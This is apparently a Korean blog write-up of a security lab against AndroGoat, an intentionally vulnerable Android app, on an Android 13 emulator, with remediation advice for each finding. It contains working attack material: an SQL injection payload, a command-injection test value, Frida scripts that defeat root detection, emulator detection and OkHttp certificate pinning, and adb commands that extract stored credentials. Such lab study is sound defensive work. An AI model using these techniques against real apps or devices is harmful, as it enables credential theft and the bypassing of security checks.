---
title: "AndroGoat Kotlin"
date: 2026-09-18 00:10:00 +0900
categories: [Security, Android]
tags: [androgoat, android, kotlin, owasp, mastg, frida, adb, mitmproxy, api33, mobile-security, writeup]
---

## 1. 들어가며

이번 실습의 대상은 **의도적으로 취약하게 만든 교육용 앱** [AndroGoat](https://github.com/satishpatnayak/AndroGoat)이다. OWASP의 [MASTG Hacking Playground](https://github.com/OWASP/MASTG-Hacking-Playground)와 [MASTG Reference Apps](https://mas.owasp.org/MASTG/apps/)도 함께 참고했다.

최신 master를 직접 빌드해 보니 `compileSdkVersion 34`, `targetSdkVersion 33`, `minSdkVersion 19`였다. 즉 오래된 Android 취약점 예제를 최신 정책에서 실행했을 때 **그대로 터지는 것**, **플랫폼이 일부 막는 것**, **debug/root/Frida 때문에 다시 열리는 것**을 구분해 볼 수 있었다.

![AndroGoat 메인 화면](/assets/img/androgoat-api33/01-main.png)
_API 33(Android 13) Google APIs x86_64 에뮬레이터에서 직접 빌드한 AndroGoat._

## 2. 실습 환경

| 항목 | 값 |
|---|---|
| OS | Windows 11 + Hyper-V |
| Emulator | Pixel 4, Android 13 / API 33, Google APIs x86_64 |
| 앱 | AndroGoat master, versionName 1.0 |
| APK 설정 | targetSdk 33, `debuggable`, `allowBackup` |
| Android 도구 | adb/platform-tools 37.0.1, Emulator 37.1.11 |
| 동적 분석 | Frida 17.18.0 / frida-server x86_64 |
| 프록시 | mitmproxy 12.2.3, `adb reverse` |

```bash
adb root
adb install -r app-debug.apk
adb shell getprop ro.build.version.sdk
# 33

adb shell dumpsys package owasp.sat.agoat | grep -E 'targetSdk|flags='
# targetSdk=33
# flags=[ DEBUGGABLE HAS_CODE ALLOW_CLEAR_USER_DATA ALLOW_BACKUP ]

adb shell run-as owasp.sat.agoat id
# uid=10174(u0_a174) ...
adb shell id
# uid=0(root) ...
```

 `run-as`는 아무 앱에나 되는 우회가 아니라 **debuggable 빌드이기 때문에** 허용된다. `adb root`도 일반 상용 단말이 아니라 루팅 가능한 Google APIs 에뮬레이터 이미지에서만 가능하다.

## 3. 전 항목 결과 요약

| # | AndroGoat 항목 | API 33 실측 결과 |
|---:|---|---|
| 1 | Root Detection | `/data/local/su`로 탐지 발화, Frida로 `false` 반환 우회 |
| 2 | Emulator Detection | 실제 Emulator 판정, Frida로 비에뮬레이터 판정 우회 |
| 3 | Shared Preferences 1 | `run-as`로 평문 ID/PW 추출 |
| 4 | Shared Preferences 2 | score XML 변조 가능, 앱 샌드박스는 유지 |
| 5 | SQLite | root/sqlite3로 평문 계정 추출 |
| 6 | Temp Files | `/data/user/0/.../users*tmp` 평문 확인 |
| 7 | SD Card | 앱 전용 external storage에서 평문 확인 |
| 8 | Keyboard Cache | 최신 Gboard는 별도 샌드박스; AndroGoat만으로 후보어 DB 직접 회수 불가 |
| 9 | Insecure Logging | logcat에 ID/PW 그대로 출력 |
| 10 | XSS | JavaScript-enabled WebView 입력 sink 확인 |
| 11 | SQLi | `' OR 1=1 --`로 모든 계정 노출 |
| 12 | WebView | `file://` 로컬 문서 및 JavaScript 로드 성공 |
| 13 | QR Code | 카메라 입력 의존; headless 실습에서는 소스 sink까지만 확인 |
| 14 | Exported Activity | `androgoat://vulnapp`로 인증 화면 우회 |
| 15 | Exported Service | 외부 `am startservice`로 invoice 다운로드 실행 |
| 16 | Exported Receiver | 명시적 broadcast만으로 고정 ID/PW/Key Toast 출력 |
| 17 | Exported Provider | 외부 `content query`로 PIN 3개 추출 |
| 18 | Clipboard | OTP가 전역 clipboard에 복사됨; API 33은 백그라운드 읽기를 제한 |
| 19 | Hardcoded Shopping Cart | `NEW2019` 회수 후 가격 0원 처리 |
| 20 | Hardcoded AI | 앱 코드의 클라이언트 측 AI 연동 구조 확인 |
| 21 | Hardcoded Cloud | APK 코드/logcat에서 AWS 형식 키 노출 |
| 22 | HTTP | mitmproxy에서 GET/200 확인 |
| 23 | HTTPS | CA 신뢰 구성 후 mitmproxy에서 GET/200 확인 |
| 24 | OkHttp3 Pinning | 실패 발화 후 Frida `check$okhttp` 후킹으로 우회 |
| 25 | Network Security Config Pinning | `cve.org` pin-set 확인; 시스템/사용자 CA 신뢰와 별개 층 |
| 26 | Misconfigured NSC | `cleartextTrafficPermitted=true`, user CA 신뢰 |
| 27 | Android Debuggable | `run-as` 성공 |
| 28 | allowBackup | manifest 플래그 확인; API 33의 구형 `adb backup`은 신뢰할 수 없음 |
| 29 | Custom URL Scheme | `androgoat://vulnapp` 외부 실행 성공 |
| 30 | Broken Cryptography | PIN에 salt 없는 MD5 사용 |
| 31 | Misconfigured Firebase DB | 현재 master에는 실제 Firebase SDK/URL이 없어 재현 대상 부재 |
| 32 | Binary Patching | `private val isAdmin=false` 단일 분기; debug/Frida에서 동일 권한 분기 조작 가능 |
| 33 | Biometric Authentication | 미등록 상태 실패 확인 후 Frida로 성공 경로 강제 |

## 4. Insecure Data Storage

### 4.1 SharedPreferences

앱 화면에 `mission63 / S3cret_API33`을 입력한 뒤 `run-as`로 XML을 읽었다.

![SharedPreferences 저장 화면](/assets/img/androgoat-api33/02-sharedprefs-ui.png)

```bash
adb shell run-as owasp.sat.agoat cat shared_prefs/users.xml
```

```xml
<map>
    <string name="password">S3cret_API33</string>
    <string name="username">mission63</string>
</map>
```

`MODE_PRIVATE`은 다른 일반 앱 UID의 직접 접근을 막아 주지만, 기기 root·debuggable `run-as`·백업·동일 프로세스 코드 실행을 상대로 암호화를 제공하지 않았다.

두 번째 SharedPreferences 예제는 점수를 `score.xml`에 정수로 저장한다. 10,001회를 누를 필요 없이 debug/root 환경에서는 `score=10000`으로 바꾼 뒤 한 번 눌러 승리 조건을 통과시킬 수 있다.

### 4.2 SQLite, 임시 파일, 외부 저장소

```bash
adb shell sqlite3 /data/user/0/owasp.sat.agoat/databases/aGoat \
  'select id,username,password from users;'
# 1|dbuser63|dbpass63
# 2|seconduser|secondpass

adb shell 'cat /data/user/0/owasp.sat.agoat/users*tmp'
# username is tempuser63

adb shell 'find /sdcard/Android/data/owasp.sat.agoat/files -type f -exec cat {} \;'
# Username - sduser63 Password -sdpass63
```

API 33의 scoped storage는 모든 앱이 `/sdcard` 전체를 읽는 상황을 줄였다. 그러나 앱 전용 external 디렉터리가 **암호화 저장소로 바뀐 것은 아니다**. root, 디버그 브리지, 백업·포렌식 획득 시 평문은 그대로다.

## 5. SQL Injection과 WebView

### 5.1 로컬 SQLite도 SQLi 대상이다

코드는 사용자 문자열을 그대로 연결한다.

```kotlin
val qry = "SELECT * FROM users WHERE username='" + username.text + "'"
```

입력값으로 `' OR 1=1 --`를 넣자 두 사용자의 비밀번호가 모두 출력됐다.

![SQL Injection으로 전체 계정 추출](/assets/img/androgoat-api33/03-sqli.png)

```text
V Query: SELECT * FROM users WHERE username='' OR 1=1 -- '
E QueryResult: Username: (dbuser63) password: (dbpass63)
E QueryResult: Username: (seconduser) password: (secondpass)
```

서버가 없다고 SQL injection으로부터 안전한 것은 아니다. 로컬 DB가 권한·라이선스·오프라인 인증 판단에 쓰이면 인증 우회가 된다. 수정은 문자열 연결이 아니라 selectionArgs/바인딩이다.

### 5.2 WebView의 file 접근

해당 Activity는 JavaScript와 다음 설정을 모두 켠다.

```kotlin
javaScriptEnabled = true
allowFileAccess = true
allowContentAccess = true
allowFileAccessFromFileURLs = true
allowUniversalAccessFromFileURLs = true
webView.loadUrl(userInput)
```

읽기 가능한 로컬 HTML에 JavaScript를 넣고 `file:///data/local/tmp/xss.html`을 입력하자 문서가 그대로 렌더링됐다.

![WebView 로컬 파일 로드](/assets/img/androgoat-api33/12-webview-xss.png)

API 30부터 일부 파일 URL 관련 setter가 비권장 되었지만, **자동 차단이 아니다**. 앱이 명시적으로 허용하고 사용자 입력을 `loadUrl`에 넘기면 API 33에서도 공격면이 남는다. `WebViewAssetLoader`, scheme/host allowlist, JavaScript 최소화가 필요하다.

`Runtime.exec("ping " + input)` 예제에는 `127.0.0.1;id`도 넣어 보았다. 그러나 Java `Runtime.exec(String)`은 셸을 자동으로 거치지 않으므로 세미콜론이 명령 구분자로 평가되지 않았다. 이 구현은 입력 검증이 나쁘지만, 이 페이로드로 곧바로 shell command injection이 된다는 것은 아니라고 생각한다.

## 6. Unprotected Android Components

### 6.1 Content Provider

권한 선언 없이 `exported=true`인 provider를 외부 shell UID에서 데이터를 요청했다.

```bash
adb shell content query \
  --uri content://owasp.sat.agoat.provider.userpinsprovider/user_pins
```

```text
Row: 0 id=3, username=Admin, pin=Admin
Row: 1 id=1, username=AndroGoat, pin=AndroGoat
Row: 2 id=2, username=root, pin=toor
```

### 6.2 Activity, Receiver, Service

```bash
adb shell am start -a android.intent.action.VIEW -d androgoat://vulnapp
# Activity: owasp.sat.agoat/.AccessControl1ViewActivity

adb shell am broadcast -n owasp.sat.agoat/.ShowDataReceiver -a mission63.EXTERNAL

adb shell am startservice -n owasp.sat.agoat/.DownloadInvoiceService
```

deep link는 PIN 검증을 거치지 않고 invoice 화면으로 진입했다. Receiver는 action allowlist나 권한 확인 없이 고정 credential을 Toast로 노출했다.

![외부 broadcast로 Receiver 발화](/assets/img/androgoat-api33/07-exported-receiver.png)

서비스도 외부에서 실행됐고 로그는 다음과 같다.

```text
I DOWNLOAD: Service onCreate
I DOWNLOAD: Invoice is being downloaded
I DOWNLOAD: Service onDestroy
```

API 33의 background execution 제한이 모든 exported service 호출을 인증해 주는 것은 아니다. 테스트 시점에는 shell/root 컨텍스트와 foreground 상태 때문에 실행됐으며, 일반 백그라운드 앱의 호출 조건은 더 제한될 수 있다고 생각한다.

## 7. Side Channel과 하드코딩 시크릿

### 7.1 logcat

```text
I Info:      Username: loguser63 and Password: LogPass63 are verified
I System.out: Username: loguser63 and Password: LogPass63 are verified
```

![로그인 값이 logcat으로 출력된 화면](/assets/img/androgoat-api33/08-insecure-log.png)

Android 4.1 이후 일반 앱이 다른 앱의 전체 로그를 읽기는 어려워졌지만, adb 권한·root·개발 빌드·크래시 수집 시스템에서는 여전히 회수된다. 비밀번호·토큰은 로그에 남기지 않는 것이 답이다.

### 7.2 Clipboard와 Keyboard Cache

카드번호를 입력하면 앱은 4자리 OTP를 `ClipData.newPlainText`로 복사한다.

![클립보드에 복사된 OTP](/assets/img/androgoat-api33/09-clipboard-otp.png)

API 33은 백그라운드 앱의 클립보드 읽기를 제한하고 접근 알림도 제공한다. 그래서 과거 버전과 같은 무제한 수집 PoC는 그대로 재현되지 않았다. 다만 foreground 악성 키보드, 접근성 서비스, 사용자의 실수로 다른 곳에 붙여넣는 것까지 막는 것은 아니므로 OTP·비밀번호를 전역 클립보드에 넣지 않는 편이 안전하다.

키보드 캐시 항목도 유사하다. 최신 Gboard 데이터는 키보드 앱의 별도 UID 샌드박스에 있으므로 AndroGoat 권한만으로 사전 DB를 꺼낼 수 없었다. 민감 필드는 `textPassword`, `importantForAutofill`, 학습 방지 옵션을 적절히 사용해야 한다.

### 7.3 Shopping/Cloud secret

APK 문자열에서 `NEW2019`를 찾은 뒤 입력하자 가격이 0으로 바뀌었다.

![하드코딩 프로모코드 사용](/assets/img/androgoat-api33/10-hardcode-promo.png)

Cloud Activity에는 AWS 형식 access key와 secret이 모두 들어 있었고 버튼을 누르자 화면/로그에 그대로 노출됐다.

![하드코딩 Cloud key 노출](/assets/img/androgoat-api33/11-hardcode-cloud.png)

```text
D [Info]: Connected to AWS account using Access key AKIAX56...ABC
          and secret key OviCws...OABCw
```

만약 실제 앱이라면 키를 폐기하고, 클라이언트에 장기 cloud credential을 두지 말아야 한다.

## 8. Root·Emulator Detection 우회

단순히 `adb root`만 켠 상태에서는 앱이 검사하는 `su` 경로와 일치하지 않을 수 있다. 그래서 검사 목록에 실제 포함된 `/data/local/su`를 만든 뒤 먼저 탐지를 확인했다.

![Root 탐지 성공](/assets/img/androgoat-api33/04-root-detected.png)

Frida 코드는 앱 메서드의 반환값 자체를 바꿨다.

```javascript
Java.perform(function () {
  const Root = Java.use('owasp.sat.agoat.RootDetectionActivity');
  Root.isRooted.implementation = function () {
    console.log('[+] isRooted() -> false');
    return false;
  };

  const Emulator = Java.use('owasp.sat.agoat.EmulatorDetectionActivity');
  Emulator.isEmulator.implementation = function () {
    console.log('[+] isEmulator() -> false');
    return false;
  };
});
```

```text
[+] isRooted() -> false
[+] isEmulator() -> false
```

![Frida root 탐지 우회](/assets/img/androgoat-api33/05-root-frida-bypass.png)

![Frida emulator 탐지 우회](/assets/img/androgoat-api33/06-emulator-frida-bypass.png)

파일 몇 개와 `Build.*` 문자열만 검사하는 방식은 보안 경계가 될 수 없다. 탐지 신호는 risk scoring의 한 요소로만 쓰고, 중요한 승인은 서버 검증·하드웨어 기반 무결성 신호·재사용 방지와 함께 설계해야 한다.

## 9. HTTP/HTTPS 프록시와 SSL Pinning

### 9.1 프록시 연결

호스트 mitmproxy 8081을 에뮬레이터의 8080으로 설정했다.

```bash
mitmdump --listen-host 127.0.0.1 --listen-port 8081
adb reverse tcp:8080 tcp:8081
adb shell settings put global http_proxy 127.0.0.1:8080
```

![HTTP 요청 발화](/assets/img/androgoat-api33/13-http-proxy.png)

```text
GET http://demo.testfire.net/
  << 200 OK 9.0k

GET https://owasp.org/ HTTP/2.0
  << 200 OK 19.6k
```

HTTPS 복호화를 위해 이 **폐기 가능한 실습 에뮬레이터**의 system CA overlay에 mitmproxy CA를 추가했다.

AndroGoat의 network security config는 다음처럼 cleartext와 user CA를 모두 허용한다.

```xml
<base-config cleartextTrafficPermitted="true">
  <trust-anchors>
    <certificates src="system" />
    <certificates src="user" />
  </trust-anchors>
</base-config>
```

### 9.2 OkHttp pinning 실패와 Frida 우회

프록시 CA를 신뢰해도 pinning은 별도 검증이므로 최초 요청은 정확히 실패했다.

```text
javax.net.ssl.SSLPeerUnverifiedException: Certificate pinning failure!
  at owasp.sat.agoat.TrafficActivity$doPinning$1.invokeSuspend(TrafficActivity.kt:90)
```

OkHttp 4.9.3에서는 public `check()`만이 아니라 Kotlin 내부의 `check$okhttp`도 후킹해야 했다.

```javascript
const Pinner = Java.use('okhttp3.CertificatePinner');
Pinner['check$okhttp'].overloads.forEach(function (overload) {
  overload.implementation = function () {
    console.log('[+] check$okhttp bypassed for ' + arguments[0]);
    return;
  };
});
```

```text
[+] OkHttp CertificatePinner.check$okhttp bypassed for owasp.org
V Response: <!DOCTYPE html> ... <title>OWASP Foundation ...</title>
```

![Frida SSL pinning 우회 실행 화면](/assets/img/androgoat-api33/15-frida-tls-bypass.png)

Native/network-security-config pinning은 OkHttp 후킹과 다른 층이다. 그렇기에 `cve.org`에 선언된 XML pin-set은 이 스크립트 하나로 일반화해 우회했다고 주장할 수 없다.

## 10. Biometric Authentication

API 33 에뮬레이터에 생체 정보가 등록되지 않은 기본 상태에서는 다음 메시지로 정상 차단됐다.

```text
The user hasn't associated any biometric credentials.
```

그 후 Frida로 `BioMetricAuthActivity` 인스턴스를 찾아 성공 UI 경로를 강제로 호출했다.

![Frida 생체 인증 성공 경로 강제](/assets/img/androgoat-api33/16-biometric-frida.png)

이 우회가 가능한 이유는 성공 후 `BiometricPrompt.CryptoObject`의 암호 연산 결과에 묶여 있지 않고, 단순 callback/UI 상태에만 의존하기 때문이다. 하지만 이번 PoC는 **UI 권한 분기 우회**이지 실제 지문 template이나 Android Keystore 키를 복제한 것이 아니다.

## 11. 기타: MD5, Binary Patching, Backup, Firebase

PIN은 salt 없는 MD5로 저장된다.

```kotlin
MessageDigest.getInstance("MD5")
    .digest(pinValue.toByteArray())
```

빠른 일반 해시는 비밀번호/PIN 저장용 KDF가 아니다. 서버라면 Argon2id/scrypt/bcrypt/PBKDF2와 고유 salt를 사용해야 하고, 단말 로컬 인증이라면 Keystore와 사용자 인증 결합을 고려해야 한다.

Binary Patching Activity의 권한은 `private val isAdmin: Boolean = false` 한 분기에 의존한다. 이런 클라이언트 boolean은 smali 패치나 런타임 후킹으로 뒤집을 수 있으므로 서버 권한 검증을 대신할 수 없다.

`allowBackup=true`도 확인됐지만 API 33에서 구형 `adb backup` 동작은 버전·제조사·앱 정책에 따라 제거되거나 제한된다. 이번 실습의 확실한 추출 경로는 debuggable `run-as`와 root였다.

README에는 Firebase 항목이 남아 있지만 현재 master 소스에서는 Firebase dependency/URL을 찾지 못했다.

## 12. 결론

API 33은 많은 것을 개선했다. scoped storage, clipboard background 제한, logcat UID 격리, background execution 제한은 오래된 공격 절차를 그대로 쓰지 못하게 한다. 하지만 다음 앱 코드 문제는 플랫폼 버전만 올려도 사라지지 않았다.

1. 평문 credential 저장과 로그 출력
2. exported component에 권한·호출자 검증 부재
3. 문자열 연결 SQL과 사용자 제어 WebView URL
4. 클라이언트에 하드코딩된 secret/권한 boolean
5. CryptoObject에 결합되지 않은 생체 인증 성공 분기
6. user CA 신뢰·cleartext 허용·고정 pin을 섞은 네트워크 설정

실습을 하며 느낀 점이라 하면, **Android 정책은 취약한 애플리케이션 로직을 대신 고쳐 주지 않는다.**라는 점이다. 반대로 `adb root`, `run-as`, 시스템 CA 주입처럼 이번 실습에서 강한 권한을 사용한 결과를 일반 상용 단말의 기본 공격 가능성과 혼동해서도 안 된다고 생각한다.

## 13. 느낀 점

처음에는 버튼을 누르고 명령어를 입력하면 취약점이 바로 보일 줄 알았다. 막상 해 보니 한 번에 되는 경우보다 “왜 안 되지?” 하고 돌아보는 시간이 더 길었다. 특히 HTTPS 요청을 프록시에서 확인하는 과정이 그랬다. 포트 연결을 고치고 인증서를 신뢰하게 만들었는데도 요청이 막혀서 당황했지만, 그제야 **인증서를 신뢰하는 것과 앱이 특정 인증서를 고집하는 SSL pinning은 다른 검사**라는 걸 확실히 이해했다. Frida로도 처음 시도한 메서드가 아니라 실제 호출되는 `check$okhttp`를 찾아야 했다. 오류 메시지를 그냥 넘기지 않고 하나씩 따라가니 Android 앱의 통신이 여러 단계를 거친다는 게 눈에 들어왔다.

저장소 실습에서는 “앱 내부에 저장하면 안전하다”라고 단순하게 생각하면 안 된다는 걸 배웠다. `MODE_PRIVATE`은 다른 일반 앱의 접근을 막아 주지만 파일 내용까지 암호화하지는 않는다. 디버그 빌드에서 `run-as`로 비밀번호가 적힌 XML을 읽었을 때 그 차이가 가장 와닿았다. 반대로 API 33의 저장소·클립보드 제한 때문에 예전 방식이 그대로 통하지 않는 부분도 있었다. **Android가 막아 주는 범위와 앱 개발자가 직접 지켜야 하는 범위**를 나눠서 봐야 한다는 뜻이다.

SQLi처럼 바로 값이 나온 항목도 있었지만, QR 코드나 키보드 캐시처럼 끝까지 확인하지 못한 항목도 있었다. 처음에는 모두 성공해야만 실습을 잘한 것 같았는데, 이제는 어느 단계까지 확인했고 무엇 때문에 더 진행하지 못했는지를 적는 것도 중요하다고 생각한다. 앞으로 Android 앱을 분석하게된다면 화면만 보지 않고 manifest, 저장된 파일, 로그, 네트워크 설정, 실제 호출되는 코드까지 연결해서 살펴보고 싶다.

### 참고 자료

- [AndroGoat GitHub](https://github.com/satishpatnayak/AndroGoat)
- [OWASP MASTG Hacking Playground](https://github.com/OWASP/MASTG-Hacking-Playground)
- [OWASP MASTG Apps](https://mas.owasp.org/MASTG/apps/)
- [Android Network Security Configuration](https://developer.android.com/privacy-and-security/security-config)
- [Android BiometricPrompt](https://developer.android.com/identity/sign-in/biometric-auth)
- [Frida Android documentation](https://frida.re/docs/android/)
- [mitmproxy documentation](https://docs.mitmproxy.org/)
